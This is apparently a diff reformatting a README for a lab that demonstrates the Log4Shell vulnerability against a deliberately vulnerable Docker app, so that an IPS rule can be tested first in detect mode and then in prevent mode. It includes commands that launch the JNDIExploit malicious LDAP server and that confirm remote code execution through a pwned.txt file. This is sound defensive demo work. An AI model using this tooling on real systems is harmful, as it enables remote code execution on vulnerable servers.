@@ -11,16 +11,18 @@ Parameters to Define:
 
 ![architecture](images/architecture.png)
 
+---
+
 ## After CloudFormation Template Deployment
 
-1. SSH into EC2 instance(Shell A)
+## 1. SSH into EC2 instance(Shell A)
     ```bash
     sudo su
     <Deploy Workload Security Agent deployment script with Linux Policy attached.>
     ```
     ![deployment_script](images/deploymentscript.png)
 
-2. In Cloud One-WS: Assign IPS rule for CVE-2021-44228 to linux machine
+## 2. In Cloud One-WS: Assign IPS rule for CVE-2021-44228 to linux machine
     - IPS rule number: **1011242**
     - Assign rule and change to **Detect Only** for now.
     - Accept all rule dependencies.
@@ -29,7 +31,9 @@ Parameters to Define:
     
     ![detect_only](images/detectonly.png)
 
-3. Start docker app(Shell A)
+---
+
+## 3. Start docker app(Shell A)
 
 ```bash
 cd log4shell-vulnerable-app
@@ -37,14 +41,16 @@ docker run -p 8080:8080 --name vulnerable-app vulnerable-app
 ```
 ![docker_run](images/dockerstart.png)
 
-4. Open Second SSH session(Shell B) and run command to create LDAP server
+---
+
+## 4. Open Second SSH session(Shell B) and run command to create LDAP server
 * [JNDIExploit](https://github.com/feihong-cs/JNDIExploit/releases/tag/v1.2) provided by feihong-cs before it was removed from GitHub.
 ```bash
 unzip JNDIExploit.v1.2.zip
 java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888
 ```
 
-5. Run Exploit
+## 5. Run Exploit
 - Open new SSH session(Shell C)
 
 ```bash
@@ -55,7 +61,9 @@ Notice the output(Shell B) of JNDIExploit, showing it has sent the malicious LDA
 
 ![shell-b](images/shell-b.png)
 
-6. Confirm RCE was successful with the creation of pwned.txt file inside the running container's /tmp directory. 
+---
+
+## 6. Confirm RCE was successful with the creation of pwned.txt file inside the running container's /tmp directory. 
 - Using Shell C
 
 ```bash
@@ -63,7 +71,9 @@ docker exec vulnerable-app ls /tmp
 ```
 ![shell-c](images/shell-c.png)
 
-7. Repeat attack this time with IPS rule set to **Prevent**
+---
+
+## Repeat attack this time with IPS rule set to **Prevent**
 
 
 <hr>
